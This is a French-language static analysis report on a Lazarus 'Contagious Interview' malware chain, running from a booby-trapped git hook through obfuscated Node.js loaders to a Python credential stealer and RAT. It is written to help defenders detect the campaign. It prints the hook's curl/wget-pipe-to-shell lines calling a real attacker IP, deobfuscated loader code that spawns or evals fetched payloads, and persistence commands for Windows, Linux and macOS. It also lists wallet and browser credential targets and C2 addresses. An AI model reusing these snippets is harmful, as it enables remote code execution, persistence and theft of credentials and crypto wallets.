# Analyse Lazarus githook : DEV#POPPER / Contagious Interview — chaîne git hook vers backdoor Python multi-OS

**Analyste :** Gordon PEIRS
**Date d'analyse :** 2026-07-20
**Type :** Analyse statique uniquement (aucune exécution, aucune connexion C2)
**Famille :** Lazarus Group / DEV#POPPER (Contagious Interview), ciblage développeurs via dépôts git piégés

> La preuve de travail reproductible est dans [`runbook.md`](runbook.md). Les scripts utilisés sont dans [`tools/`](tools/).

---

## 1. Contexte

La campagne DEV#POPPER, documentée pour la première fois par Securonix en 2023 et activement suivie sous ce nom en 2024-2026, cible des développeurs logiciels via de fausses offres d'emploi ou des invitations à des entretiens techniques. La victime est invitée à cloner un dépôt git, à effectuer une tâche de code (lancer les tests, installer les dépendances), et le git hook déclenche la chaîne silencieusement en arrière-plan.

L'infection est conçue pour fonctionner sur les trois plateformes cibles des développeurs : Windows, macOS et Linux. La chaîne entière est pilotée depuis Node.js (pré-installé sur toutes les plateformes) jusqu'au dépôt des backdoors Python.

Les samples analysés proviennent de la clé USB de recherche. Aucun n'est exécuté. L'analyse est conduite entièrement statiquement sur les cinq fichiers de la chaîne.

---

## 2. Identité des échantillons

| Fichier | SHA256 | Taille | Rôle |
|---|---|---|---|
| `a129de4f...sh` | `a129de4fd4f1374a292bd8964df30c9e82c99bac680c4d36d6890fbf30ffac1c` | 320 B | Git hook (stage 0) |
| `02e6fbf7...unknown` | `02e6fbf7319629a352755bded9ec28dfdaffc0affb7c1a7de9a1b3b69bd91de5` | 20 163 B | Stage 1 JS |
| `a3f41333...js` | `a3f413338c28c464f0c2b2369f1bc1b203261fae68c808b73c2df782dc4b1c27` | 3 541 B | Stage 2 JS |
| `683a1607...js` | `683a1607808f49446191d775d181ec9cccd1d629fba76e4d416fa54d1cf42630` | 9 803 B | Stage 3 JS |
| `b34aa84e...py` | `b34aa84e8b4ad57d773fab6cbd7c40cda65f5f17c566cbd726ce3edcd04255b1` | ~485 lignes | Browser stealer Python |
| `cd3b606d...py` | `cd3b606d31c9d3c2ee972916f8de9a403caf00f00698fd6b9acece6ff30647c6` | ~799 lignes | Comms + C2 Python |

---

## 3. Outillage

- `file`, `xxd` : identification et inspection hexadécimale
- [`tools/js_deobf.py`](tools/js_deobf.py) : désobfuscateur obfuscator.io écrit pour cette analyse — extrait le tableau de strings, trouve la rotation via évaluation directe de la formule IIFE, remplace les appels de lookup
- Python 3 (`base64`, `re`, `urllib.parse`) : décodage du custom-b64 obfuscator.io (alphabet swapcase + URL-decode)

---

## 4. Stage 0 — Git hook

```bash
#!/bin/sh
case "$OSTYPE" in
  darwin*)  curl -s 'http://144.172.103.226/301/301m' -L | sh > /dev/null 2>&1 &;;
  linux*)   wget -qO- 'http://144.172.103.226/301/301l' -L | sh > /dev/null 2>&1 &;;
  msys*)    curl -s http://144.172.103.226/301/301w -L | cmd > /dev/null 2>&1 &;;
  cygwin*)  curl -s http://144.172.103.226/301/301w -L | cmd > /dev/null 2>&1 &;;
  *)        curl -s 'http://144.172.103.226/301/301m' -L | sh > /dev/null 2>&1 &;;
esac
```

Le hook est positionné dans `.git/hooks/` (probablement `pre-commit` ou `post-checkout`, injecté lors du premier `git clone`). Il détecte l'OS via `$OSTYPE`, télécharge le payload correspondant depuis `144.172.103.226/301/`, et l'exécute directement en mémoire via `| sh` ou `| cmd`. Le `> /dev/null 2>&1 &` supprime tout output et lance en arrière-plan — l'exécution est invisible depuis le terminal de la victime.

Les trois endpoints servent du JavaScript Node.js (`301m` = macOS, `301l` = Linux, `301w` = Windows). Le `-L` suit les redirections HTTP, compatible avec une éventuelle couche CDN devant le serveur C2.

---

## 5. Stage 1 — Loader JS initial (`.unknown`)

**Hash :** `02e6fbf7319629a352755bded9ec28dfdaffc0affb7c1a7de9a1b3b69bd91de5`
**Taille :** 20 163 octets, fichier `.unknown` (pas d'extension — servi directement par le C2 via `| sh` puis `| node`)

### 5.1 Obfuscation

Le fichier est entièrement sur une ligne, signature d'obfuscator.io. La structure :

```
function a3b(a,b){ a=a-0x190; ... }  // lookup function
function a3a(){ const b5=[...370 strings...]; a3a=function(){return b5;}; return a3a(); }
(function(a,b){ const ax=a3b,c=a(); ... }(a3a, 0x291e9))  // IIFE, rotation check
const ay=a3b  // alias principal du lookup
const ax=a3b  // alias local (IIFE uniquement)
```

Paramètres d'obfuscation :
- Tableau : `a3a()`, 370 entrées, custom-base64 encodées
- Lookup : `a3b`, base offset `0x190`, alias global `ay` (185 appels), alias IIFE `ax`
- Cible IIFE : `0x291e9` (168425)
- Rotation correcte : **112** (trouvée par évaluation directe de la formule IIFE)
- Encodage strings : custom-base64 (alphabet swapcase + URL-decode)

### 5.2 Rôle réel : stealer crypto complet

Stage 1 est usuellement décrit dans les rapports publics comme un "loader" ou "controller". L'analyse par second pass (182 alias locaux résolus dans `tools/02e6fbf7_full_resolved.js`) révèle qu'il est avant tout un stealer de crypto wallets et de données navigateur. Il s'exécute en premier, avant même de contacter le C2 pour obtenir les stages suivants.

Le répertoire de staging est `~/.n3/` (créé avec `mkdirSync` si absent). La fonction d'upload envoie tous les fichiers collectés à `http://95.216.64.240:1224/uploads` — **même serveur que le Python stealer, même endpoint** — avant de charger les stages 2 et 3.

Les noms de fonctions internes révélés par les messages d'erreur embarqués :
- `UpUserData(Q)` et `UpUserData(X)` — vol de données profil navigateur (deux chemins distincts)
- `UpKeychainData` — vol du trousseau macOS
- `uploadFiles (Edge)` — vol des données Edge spécifiquement
- `uploadFiles` — upload générique vers le C2

### 5.3 Ciblage wallets crypto — 22 extensions Chrome

L'array `a1` dans stage 1 contient 22 IDs d'extensions Chrome. Le code itère sur chaque profil navigateur (jusqu'à 120 profils : `Default`, `Profile 1`, ... `Profile 119`) et vole le contenu de `<profil>/Local Extension Settings/<extension_id>/` — les bases LevelDB où chaque extension Chrome stocke ses données persistantes (adresses, clés chiffrées, état du wallet).

IDs ciblés (reconstruction depuis les fragments obfusqués) :

| # | Extension ID | Wallet identifié |
|---|---|---|
| 1 | `nkbihfbeogaeaoehlefnkodbefgpgknn` | **MetaMask** |
| 2 | `ejbalbakoplchlghecdalmeeeajnimhm` | Wallet crypto (non identifié) |
| 3 | `fhbohimaelbohpjbbldcngcnapndodjp` | **Binance Chain Wallet** |
| 4 | `ibnejdfjmmkpcnlpebklmnkoeoihofec` | Wallet crypto (non identifié) |
| 5 | `bfnaelmomeimhlpmgjnjophhpkkoljpa` | **Phantom (Solana)** |
| 6 | `aeachknmefphepccionboohckonoeemg` | Wallet crypto (non identifié) |
| 7 | `hifafgmccdpekplomjjkcfgodnhcellj` | Wallet crypto (non identifié) |
| 8 | `jblndlipeogpafnldhgmapagcccfchpi` | Wallet crypto (non identifié) |
| 9 | `acmacodkjbdgmoleebolmdjonilkdbch` | Wallet crypto (non identifié) |
| 10 | `dlcobpjiigpikoobohmabehhmhfoodbb` | Wallet crypto (non identifié) |
| 11 | `mcohilncbfahbmgdjkbpemcciiolgcge` | Wallet crypto (non identifié) |
| 12 | `agoakfejjabomempkjlepdflaleeobhb` | Wallet crypto (non identifié) |
| 13 | `omaabbefbmiijedngplfjmnooppbclkk` | Wallet crypto (non identifié) |
| 14 | `aholpfdialjgjfhomihkjbmgjidlcdno` | Wallet crypto (non identifié) |
| 15 | `nphplpgoakhhjchkkhmiggakijnkhfnd` | Wallet crypto (non identifié) |
| 16 | `penjlddjkjgpnkllboccdgccekpkcbin` | Wallet crypto (non identifié) |
| 17 | `lgmpcpglpngdoalbgeoldeajfclnhafa` | Wallet crypto (non identifié) |
| 18 | `fldfpgipfncgndfolcbkdeeknbbbnhcc` | Wallet crypto (non identifié) |
| 19 | `bhhhlbepdkbapadjdnnojkbgioiodbic` | Wallet crypto (non identifié) |
| 20 | `aeachknmefphepccionboohckonoeemg` | Wallet crypto (non identifié, doublon #6) |
| 21 | `gjnckgkfmgmibbkoficdidcljeaaaheg` | Wallet crypto (non identifié) |
| 22 | `afbcbjpbpfadlkmhmclhkeeodmamcflc` | Wallet crypto (non identifié) |

L'entrée 20 est un doublon de l'entrée 6 — vraisemblablement un bug de copier-coller dans le code attaquant.

### 5.4 Wallets non-navigateur et données additionnelles

En parallèle des extensions Chrome, stage 1 vole :

**Clé Solana CLI** :
```
~/.config/solana/id.json    (keypair JSON — clé privée en clair)
solana_id.txt               (copie texte)
```

**Exodus wallet** :
```
macOS : ~/Library/Application Support/exodus.wallet
Linux : ~/.config/Exodus/exodus.wallet
```

**Navigateurs Chrome-based** (chemins OS-adaptatifs) :
- `BraveSoftware/Brave-Browser`
- `Local/Google/Chrome`
- `Google/Chrome`
- `com.operasoftware.Opera`
- Opera (`opera`)

Fichiers volés par profil : `Login Data` (mots de passe), `Local State` (clé de déchiffrement AES), `.ldb`/`.log` (LevelDB brut), `Local Extension Settings/<id>/` (données wallet).

### 5.5 Séquence d'exfiltration

1. Stage 1 s'exécute en mémoire via `node -e <code>`
2. Crée `~/.n3/` comme répertoire de staging
3. Copie et compresse les fichiers vol dans `~/.n3/`
4. `POST http://95.216.64.240:1224/uploads` — exfiltration vers C2
5. Ensuite seulement, contacte le C2 stage 2 pour charger les stages suivants

La victime perd ses clés crypto avant même que le RAT Python soit installé.

---

## 6. Stage 2 — Loader HTTP vers C2

**Hash :** `a3f413338c28c464f0c2b2369f1bc1b203261fae68c808b73c2df782dc4b1c27`
**Taille :** 3 541 octets

### 6.1 Obfuscation

```
function D(){ const J=[...57 strings...]; D=function(){return J;}; return D(); }
function W(c,g){ c=c-0xc0; const s=D(); ... }  // lookup, base 0xc0
(function(a,X){...}(D, 0xcc8a4))  // IIFE, formule avec W(C.a),...
```

Paramètres :
- Tableau : `D()`, 57 entrées
- Lookup : `W(c,g)`, base offset `0xc0`
- Cible IIFE : `0xcc8a4` (837796)
- Rotation correcte : **46**
- Constantes objets : 9 objets `{a:0xNN,...}` injectés dans la formule IIFE

### 6.2 IP C2 (obfusquée)

La variable `O = 'LjEwMi4xOTUuMjE3Mzg='` encode l'IP. La fonction `j(X)` la décode en trois étapes :
1. Découpe `O` en fragments de 2 chars (`M`, `u`, `v`) selon des offsets fixes
2. Recolle dans l'ordre `u+M+v` = `'OTUuMjE3LjEwMi4xMzg='`
3. `Buffer.from('OTUuMjE3LjEwMi4xMzg=', 'base64').toString('utf8')` = `95.217.102.138`

URL C2 complète : `http://95.217.102.138:1144/s/30620700`

### 6.3 Protocole C2

```javascript
// Stage 2 abrégé (après désobfuscation)
const T = require('http'), G = require('https')
const H = require('child_process')
const m = '30620700'  // campaign ID

const N = async a => {
  let X = j(a) + '/s/'
  X += m  // -> http://95.217.102.138:1144/s/30620700
  y(X, (w, M, u) => {
    const v = Buffer.from(u).toString('utf-8')
    i(v) > 0x0 && P()  // si réponse contient 'JS6', exécuter stage 3
  })
}

const i = a => {
  if (0 == a.search('JS6')) {    // réponse formatée 'JS6[...]'
    arr = B(X), arr = arr.split(',')
    b = 'http://' + arr[0] + ':' + arr[1]  // ip:port
    e = arr[2], F = arr[3]                   // params stage 3
    return 1
  }
  return 0
}

const A = () => {
  const a = b + '/main'  // télécharger stage 3
  y(a, (X, w, M) => {
    const k = `global['g']='${F}'; global['h']='${e}'; ` + M
    H.spawn('node', ['-e', k], { detached: true })
    .on('error', () => eval(k))  // fallback eval si spawn échoue
  })
}
```

L'ID de campagne `30620700` est probablement un timestamp encodé (30/06 = 30 juin, 07 = heure, 00 = minutes) ou un identifiant de build arbitraire. Il sert de cookie de tracking côté C2.

Le protocole de réponse est `JS6[base64(ip,port,param1,param2)]` : les params sont passés en globals Node.js (`global['g']` et `global['h']`) au stage 3, qui les retrouvera via `global['h'] || '36'` et `global['g'] || '700'`.

---

## 7. Stage 3 — Dropper de persistance

**Hash :** `683a1607808f49446191d775d181ec9cccd1d629fba76e4d416fa54d1cf42630`
**Taille :** 9 803 octets

### 7.1 Obfuscation

```
function j(){ const ai=[...220 strings...]; j=function(){return ai;}; return j(); }
const Q = k    // alias global
function k(a,b){ a=a-0x15d; const c=j(); ... }  // lookup, base 0x15d
(function(A,B){ const O=k, D=A(); ... }(j, 0x284f5))  // IIFE, formule avec O()
```

Paramètres :
- Tableau : `j()`, 220 entrées
- Lookup : `k`, base offset `0x15d`, alias global `Q` (40 appels)
- Cible IIFE : `0x284f5` (165109)
- Rotation correcte : **70**

### 7.2 Modules Node.js chargés

```javascript
const e = require('fs')
const n = require('http'), t = require('https')
const r = require('os')
const i = require('path')
const o = require('fs/promises')
const { execSync: p, execFileSync: f, spawn: h } = require('child_process')
```

### 7.3 Téléchargement depuis Cloudflare R2

L'URL de téléchargement varie selon l'OS (via `c = r.platform()`) :

```javascript
const u = 'https://pub-' + (
  'w' == c[0]
    ? 'acf013a9b65140b7b58cc3c104ee7105'    // Windows
    : '06714264305c44ea94491c0c8d961a87'    // Linux / macOS
) + '.r2.dev'
```

Les noms de payloads sont extraits directement du tableau de strings (rotation 70) :
- Windows : `https://pub-acf013a9b65140b7b58cc3c104ee7105.r2.dev/p.zip`
- Linux : `https://pub-06714264305c44ea94491c0c8d961a87.r2.dev/plinux.tar.xz`
- macOS : `https://pub-06714264305c44ea94491c0c8d961a87.r2.dev/pmac.tar.gz`

L'hébergement sur Cloudflare R2 est délibéré : l'IP de téléchargement appartient à Cloudflare (`104.x.x.x`) et ne peut pas être bloquée sans couper l'accès à tout CDN R2. Le bucket est public (pas d'authentification requise).

Le check `'gradle-7-bin'` dans les constantes d'objet du loader suggère une vérification de la présence d'un environnement de développement Gradle (Java) avant le déclenchement — confirmation du profil de victime ciblé (développeur Java/Android).

### 7.4 Persistance multi-OS

Le nom du composant de persistance est `PyToolUpdater` (`$='PyTool'+'Update'+'r'`). La variable `w = home + '/.viminf'` pointe vers le script Node.js sauvegardé sur disque. Les trois mécanismes font exécuter `node ~/.viminf` à chaque connexion/démarrage, **pas Python directement** — `~/.viminf` est le payload Node.js (stage 3 savegardé), pas un script Python.

**Windows :**
```
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run
       /v PyToolUpdater /t REG_SZ
       /d "<node_executable> <home>\.viminf" /f
```

**Linux (XDG autostart) :**

La fonction `q()` crée `~/.config/autostart/PyToolUpdater.desktop` avec le contenu suivant :
```
[Desktop Entry]
Type=Application
Name=PyToolUpdater
Exec=<node_executable> <home>/.viminf
X-GNOME-Autostart-enabled=true
```

Le répertoire `~/.config/autostart/` est créé avec `mkdirSync(..., {recursive: true})` si absent.

**macOS (`~/.zprofile`) :**

La fonction `q()` injecte un bloc bootstrap dans `~/.zprofile` entre deux balises de contrôle :

```bash
# >>> PyToolUpdater bootstrap >>
if [ -f "/tmp/PyToolUpdater.pid" ] && ps -p "$(cat "/tmp/PyToolUpdater.pid")" 2>/dev/null)" >/dev/null 2>&1; then
    : # already running - leave it alone
else
    nohup "<node_executable>" "<home>/.viminf" </dev/null >>"/tmp/PyToolUpdater.log" 2>&1 &
    echo $! > "/tmp/PyToolUpdater.pid"
fi
# <<< PyToolUpdater bootstrap <<
```

Si le bloc existe déjà (marqueur `# >>> PyToolUpdater bootstrap >>` présent), il est remplacé proprement via `RegExp` — le mécanisme est idempotent. Le PID est tracé dans `/tmp/PyToolUpdater.pid` et le log stderr dans `/tmp/PyToolUpdater.log`.

### 7.5 Extraction du payload — commande `tar`

La fonction `F()` réalise l'extraction du payload téléchargé depuis Cloudflare R2 :

```javascript
const F = async A => {
  // D = true si win32 ET exécuté sous Git Bash / MSYS
  const D = 'win32' === c && !!(process.env.MSYSTEM || process.env.MSYS || /bash/i.test(process.env.SHELL || ''))
  const H = D ? E(A) : A    // normalise le chemin archive pour Git Bash
  const I = D ? E(s) : s    // normalise le home dir
  return new Promise((J, K) => {
    o('tar -xf ' + H + ' -C ' + I, G, (L, M, N) => {
      if (L) return z = 0x0, K(L)
      z = 0x3117874; J()    // sentinelle "extraction réussie"
    })
  })
}
```

La commande est `tar -xf <archive> -C <homedir>` sur **toutes les plateformes**, y compris Windows (Node.js utilise Git Bash si disponible). Sur Windows sans Git Bash, le fallback serait `7zip` ou `unzip` selon l'OS — le code vérifie `MSYSTEM`/`MSYS` pour détecter l'environnement Git Bash avant d'ajuster les chemins via `E()` (conversion `/c/Users/...` → chemin Unix).

### 7.6 Constantes d'état St et z

Stage 3 utilise deux constantes numériques comme sentinelles d'état :

```javascript
const St = 0x311786e  // = 51476590 — valeur de base, assignée une fois au niveau module
let z = 0x0           // initialisée à 0

// Après extraction réussie (F() callback sans erreur) :
z = 0x3117874         // = 51476596 — sentinelle "extraction OK" (diff = 6 avec St)

// Si extraction échoue :
z = 0x0               // remise à 0
```

Ces valeurs ne sont pas des tailles de fichier ni des checksums — elles sont des indicateurs d'état de la machine à état interne du dropper. `z = 0x3117874` signifie "le payload a été extrait avec succès, continuer avec l'installation".

---

## 8. Python backdoor — browser stealer (`b34aa84e...py`)

### 8.1 Rôle

Stealer de credentials navigateur multi-plateforme. Cible : Chrome, Brave, Opera, Yandex, Edge.

### 8.2 Paramètres

```python
sType = "36"         # type de session (passé depuis stage 3 via global['h'])
gType = "700"        # sous-type (passé depuis stage 3 via global['g'])
HOST = '95.216.64.240'
PORT = 1224
host2 = f'http://{HOST}:{PORT}'
```

### 8.3 Opérations

1. **Installation des dépendances à la volée** : `pywin32`, `pycryptodome`, `secretstorage`, `requests` — installés via `subprocess.check_call([sys.executable, '-m', 'pip', 'install', ...])` sans interaction utilisateur
2. **Itération exhaustive** : jusqu'à 120 profils par navigateur (`Default`, `Profile 1`, ..., `Profile 119`)
3. **Vol de mots de passe** : lit `Login Data` (SQLite), déchiffre via DPAPI (Windows) ou `pycryptodome` AES-CBC/GCM (Linux/macOS). La clé Linux est dérivée via PBKDF2 avec le mot de passe keychain (`peanuts` par défaut) et le sel `saltysalt`, 1 itération.
4. **Vol de cartes bancaires** : `retrieve_web()` lit la table `credit_cards` du même profil — numéro de carte chiffré, date d'expiration, nom du titulaire.
5. **Exfiltration** :
   - `POST http://95.216.64.240:1224/keys` — credentials navigateur
   - `POST http://95.216.64.240:1224/uploads` — fichiers

### 8.4 Gestion de l'OS

```python
if os_type == "Windows": oss = Windows
elif os_type == "Linux":  oss = Linux
elif os_type == "Darwin": oss = Mac
else: os.remove(sys.argv[0]); sys.exit(-1)  # auto-destruction si OS inconnu
```

L'auto-destruction sur OS inconnu (`else`) limite l'exposition forensique. Le chemin de destruction (`dir + sys.argv[0]`) est construit avec `os.getcwd()`, ce qui peut échouer si le CWD a changé — vraisemblablement un bug de code.

---

## 9. Python comms — RAT complet (`cd3b606d...py`)

### 9.1 Rôle

Bien plus qu'un simple module de C2 : un RAT (Remote Access Trojan) complet avec keylogger, clipboard monitor, exécution de commandes arbitraires, téléchargement de fichiers et eval Python dynamique. Deux couches C2 coexistent : une couche HTTP pour le beacon initial, une couche TCP brute pour le contrôle interactif.

### 9.2 Anti-doublon

```python
lock_file = '.poc2'
def check_run():
    if os.path.exists(lock_file):
        pid = int(open(lock_file).read())
        if psutil.pid_exists(pid): sys.exit(0)
    open(lock_file, 'w').write(str(os.getpid()))
```

Empêche les instances multiples. La dépendance `psutil` est auto-installée si absente.

### 9.3 Beacon HTTP initial

```python
HOST = '95.216.64.240'
PORT = 1224

C = {
  'ts': str(int(time.time()*1000)),
  'type': sType,   # "36"
  'hid': hn,       # "700_<hostname>"
  'ss': 'sys_info',
  'cc': str(sys_info)  # uuid, platform, release, username, IP interne, géo ip-api.com
}
POST http://95.216.64.240:1224/keys
```

La géolocalisation passe par `ip-api.com/json` (User-Agent : `python-urllib/3.0`). Le JSON retourné inclut lat/lon, ISP, timezone, IP publique et IP interne — un profil complet de la victime avant même l'établissement du canal de contrôle.

Le champ `hid` varie selon le mode d'élévation `gType` :

```python
if gType == "root":
    A.hostname = node()             # hostname seul, sans préfixe
else:
    A.hostname = gType + "_" + node()   # "700_<hostname>"
```

Quand le malware tourne avec `gType="root"` (mode élévation), l'identifiant C2 ne porte pas le préfixe de campagne. Ce mode est activé depuis stage 2 via `global['g']` — le C2 peut passer `root` à la place de `700` pour indiquer que la machine compromise est déjà root ou que les permissions sont élevées. Dans ce sample, `gType="700"` est la valeur normale.

### 9.4 Canal RAT — TCP brute vers troisième C2

```python
HOST0 = '69.197.164.135'
PORT0 = 2245
```

Après le beacon HTTP, le module établit une connexion TCP persistante vers `69.197.164.135:2245`. Ce C2 est distinct des deux premiers (pas dans les stages JS). Le protocole est binaire :

```
Frame = [4 octets big-endian = longueur] + [JSON UTF-8]
JSON  = {"code": N, "args": {...}}
```

Constantes de session :
- `MAX_PAYLOAD_SIZE = 16 MB`
- `FRAME_DEADLINE = 20 s`
- `HEARTBEAT_CODE = 98` (ping/pong entre `code=98, args='ping'` et `code=98, args='pong'`)
- `HEARTBEAT_TIMEOUT = 45 s`
- Reconnexion : backoff exponentiel jusqu'à 30 s

La session s'identifie au C2 à la connexion :
```python
info = {'type': gType, 'group': sType, 'name': hostname, 'v': 260715}
```
Le champ `'v': 260715` est vraisemblablement un numéro de build/version (format `AAMMJJ` → `26-07-15` = 15 juillet 2026, soit la date de déploiement du sample).

### 9.5 Table des commandes RAT

| Code | Méthode | Action |
|---|---|---|
| `1` | `ssh_obj` | Exécution de commande shell (sortie renvoyée au C2) |
| `2` | `ssh_cmd` | Kill Python (`taskkill python.exe` / `killall python`) — auto-nettoyage |
| `3` | `ssh_clip` | Exfiltration du buffer clavier/clipboard (`e_buf`) |
| `4` | `ssh_run` | Téléchargement + exécution du browser stealer depuis `/brow/<sType>/<gType>` |
| `5` | `ssh_upload` | Upload : répertoire entier, fichier unique, ou recherche par pattern |
| `6` | `ssh_kill` | Kill Chrome et Brave (préparation avant re-vol de cookies) |
| `8` | `ssh_env` | Recherche et upload de tous les fichiers `.env` sur tous les drives |
| `9` | `ssh_eval` | Eval/exec Python arbitraire (base64 ou texte brut) |
| `10` | `ssh_conn` | Connexion à un nouveau C2 |
| `11` | `ssh_inject` | Injection de code (stub non implémenté — `out` indéfini) |

La commande `9` (`ssh_eval`) est la plus dangereuse : le C2 peut envoyer n'importe quel code Python encodé en base64 pour exécution directe via `exec()` ou `subprocess`.

**`ssh_inject` (code 11) — stub mort :**

```python
def ssh_inject(A, args):
    D = args[_A]; cmd = args['cmd']; cmd = ast.literal_eval(cmd)
    mode = cmd['m']; expr = cmd['e']
    p = {_A: D, _O: 'inject'}
    A.send_n(D, 11, out)    # NameError: name 'out' is not defined
```

La variable `out` n'est jamais définie dans la portée de cette fonction — toute invocation via `code=11` provoque un `NameError` Python immédiat. La fonctionnalité (injection de processus, probablement DLL/shellcode via `mode` et `expr`) est planifiée mais non implémentée dans ce sample. Le stub est présent et dispatché correctement, mais inutilisable.

### 9.6 Keylogger Windows

Sur Windows uniquement, deux threads supplémentaires capturent en continu :

- **Keyboard** (`pynput`) : chaque touche est enregistrée avec contexte fenêtre (`win32gui.GetForegroundWindow`, PID, nom du processus, titre de fenêtre). Les touches Ctrl sont préfixées `<^X>`, les touches spéciales entre `<...>`.
- **Mouse** (`pynput`) : clics gauche (`<..>` / `<.>`) et droit (`<,,>` / `<,>`) avec indicateur de changement de fenêtre.
- **Clipboard** (`pyperclip`) : polling toutes les 500 ms, nouvelles valeurs encadrées de marqueurs `=====BEGIN=====` / `=====END=====`.

Tout est bufferisé dans `e_buf` et exfiltré sur commande `3` (`ssh_clip`).

### 9.7 Répertoire de travail `~/.n2/`

Le RAT crée et utilise `~/.n2/` comme répertoire de travail :
- `~/.n2/flist` : journal des fichiers uploadés (timestamp + chemin local)
- `~/.n2/bow` : browser stealer téléchargé depuis `/brow/<sType>/<gType>`, exécuté sur commande `4`

### 9.8 Auto-upload commenté (ciblage crypto WIP)

Le code contient des fonctions de recherche de fichiers crypto commentées :

```python
def auto_up():
    # fpatten('*mnemonic*')
    # fpatten('*metamask*')
    # fpatten('*wallet*')
    # fpatten('*seed*')
    # fpatten('truffle.config*')
    # fpatten('hardhat.config*')
    # fenv()
    print()
```

La fonctionnalité est désactivée dans ce sample mais l'infrastructure est en place — exfiltration de phrases mnémoniques, wallets MetaMask, configs Hardhat/Truffle (développeurs blockchain). Cohérent avec le profil de victimologie DEV#POPPER.

### 9.9 Endpoints HTTP C2

| Endpoint | Méthode | Données |
|---|---|---|
| `/keys` | POST URL-encoded | Beacon système initial |
| `/uploads` | POST multipart | Fichiers exfiltrés (depuis `ssh_upload` et `auto_up`) |
| `/brow/{sType}/{gType}` | GET | Browser stealer (téléchargé sur commande code 4) |

---

## 10. Infrastructure C2

| IP | Port | Protocole | Rôle dans la chaîne |
|---|---|---|---|
| `144.172.103.226` | 80 | HTTP | Serveur staging (git hook) — sert les stages 1 selon l'OS |
| `95.217.102.138` | 1144 | HTTP | Stage 2 — distribue stage 3, ID campagne `/s/30620700` |
| `95.216.64.240` | 1224 | HTTP | Beacon Python, credentials, commandes HTTP |
| `69.197.164.135` | 2245 | TCP brute | Canal RAT persistant (frames JSON préfixées longueur) |

Les adresses `95.217.x` et `95.216.x` sont dans des /24 adjacents, probablement le même opérateur ou le même cluster d'infra louée. Les ports 1144 et 1224 sont non-standard mais dans une plage cohérente avec les autres clusters DEV#POPPER documentés.

La séparation HTTP/TCP est intentionnelle : le canal HTTP (`95.216.64.240:1224`) est unidirectionnel et simule du trafic web légitime pour le beacon. Le canal TCP (`69.197.164.135:2245`) est le vrai canal de contrôle interactif, distinct pour compartimenter la détection.

Le CDN Cloudflare R2 sert de distribution intermédiaire — deux buckets publics distincts selon l'OS, ce qui permet une rotation des payloads sans modifier l'URL hardcodée dans stage 3.

---

## 11. Attribution

La chaîne présente les marqueurs suivants, tous documentés dans les rapports publics sur DEV#POPPER / Contagious Interview (Securonix 2023, SentinelOne 2024, Unit 42 2025) :

- **Vecteur** : git hook dans un dépôt partagé lors d'un entretien développeur
- **Node.js comme premier interpréteur** : élimine la dépendance à Python ou à un loader natif
- **obfuscator.io** : outil d'obfuscation favori de la campagne depuis 2023
- **Nom `PyToolUpdater`** : IoC nommé identifié dans plusieurs rapports publics
- **`~/.viminf`** : nom de persistence Linux documenté dans la campagne
- **Double C2 (distribution + backend Python)** : architecture en deux couches identique aux campagnes 2024
- **Cloudflare R2** : utilisation de CDN légitimes pour contourner le filtrage réseau, observée depuis 2024

Le `gType = "700"` et `sType = "36"` sont des tags de tracking interne propres à ce cluster.

**Éléments non documentés dans les rapports publics connus** identifiés dans cette analyse :

- **Stage 1 est un stealer complet**, pas seulement un loader : 22 extensions Chrome crypto wallet ciblées (MetaMask, Phantom, Binance Chain Wallet, 19 autres), Solana CLI keypair, Exodus wallet, exfiltration via `~/.n3/` avant même l'installation du RAT. Les rapports publics décrivent stage 1 comme un simple orchestrateur JS.
- **`69.197.164.135:2245`** — 4e IP C2, canal TCP RAT brute. Absente de ThreatFox, URLHaus et MalwareBazaar au moment de l'analyse (2026-07-20). Infrastructure : Cloud Clusters Inc / WholeSale Internet (AS32097), Kansas City MO US. Shodan ne voit que ports 80/443 (Apache 2.4.58 + PHP 8.1.25 + OpenSSL 3.1.3, certificat auto-signé) — port 2245 non indexé, probablement filtré.
- **`v: 260715`** — champ de version dans le beacon TCP. Format `AAMMJJ` = 2026-07-15, date de build du sample (5 jours avant la date d'analyse).
- **`ssh_inject` (code 11) mort** — stub présent et dispatché mais provoque `NameError: name 'out' is not defined` à chaque appel. Fonctionnalité d'injection de processus planifiée, non implémentée.
- **`gType="root"` mode** — branche conditionnelle dans le beacon : quand `gType="root"`, le hostname envoyé au C2 ne porte pas le préfixe de campagne `700_`. Indique un mode opérationnel sur machine compromise avec privilèges élevés.
- **Constantes St/z** (`0x311786e`/`0x3117874`) — sentinelles d'état internes du dropper, non des tailles ou checksums.

---

## 12. IoCs

### Hashes

| SHA256 | Nom | Rôle |
|---|---|---|
| `a129de4fd4f1374a292bd8964df30c9e82c99bac680c4d36d6890fbf30ffac1c` | `a129de4f.sh` | Git hook |
| `02e6fbf7319629a352755bded9ec28dfdaffc0affb7c1a7de9a1b3b69bd91de5` | `02e6fbf7.unknown` | Stage 1 JS |
| `a3f413338c28c464f0c2b2369f1bc1b203261fae68c808b73c2df782dc4b1c27` | `a3f41333.js` | Stage 2 JS |
| `683a1607808f49446191d775d181ec9cccd1d629fba76e4d416fa54d1cf42630` | `683a1607.js` | Stage 3 JS |
| `b34aa84e8b4ad57d773fab6cbd7c40cda65f5f17c566cbd726ce3edcd04255b1` | `b34aa84e.py` | Browser stealer |
| `cd3b606d31c9d3c2ee972916f8de9a403caf00f00698fd6b9acece6ff30647c6` | `cd3b606d.py` | Comms C2 |

### Réseau

| Indicateur | Type | Note |
|---|---|---|
| `144.172.103.226` | IP | Stage 0-1 C2, HTTP |
| `95.217.102.138:1144` | IP:port | Stage 2 C2, HTTP |
| `95.216.64.240:1224` | IP:port | Python C2, HTTP (beacon + uploads) |
| `69.197.164.135:2245` | IP:port | RAT C2, TCP brute (canal persistant) |
| `pub-acf013a9b65140b7b58cc3c104ee7105.r2.dev` | FQDN CDN | Payload Windows (`p.zip`) |
| `pub-06714264305c44ea94491c0c8d961a87.r2.dev` | FQDN CDN | Payload Linux (`plinux.tar.xz`) + macOS (`pmac.tar.gz`) |
| `/s/30620700` | URI | Chemin stage 2, ID campagne |
| `ip-api.com/json` | FQDN | Géolocalisation (appelé par Python comms) |

### Système de fichiers / Registre

| Indicateur | Plateforme | Type |
|---|---|---|
| `~/.viminf` | Linux/macOS | Payload Node.js persisté sur disque (exécuté par le mécanisme de persistance) |
| `~/.config/autostart/PyToolUpdater.desktop` | Linux | Fichier XDG autostart (mécanisme de persistance) |
| `~/.zprofile` | macOS | Bloc bootstrap injecté (marqueurs `# >>> PyToolUpdater bootstrap >>`) |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\PyToolUpdater` | Windows | Registry run key |
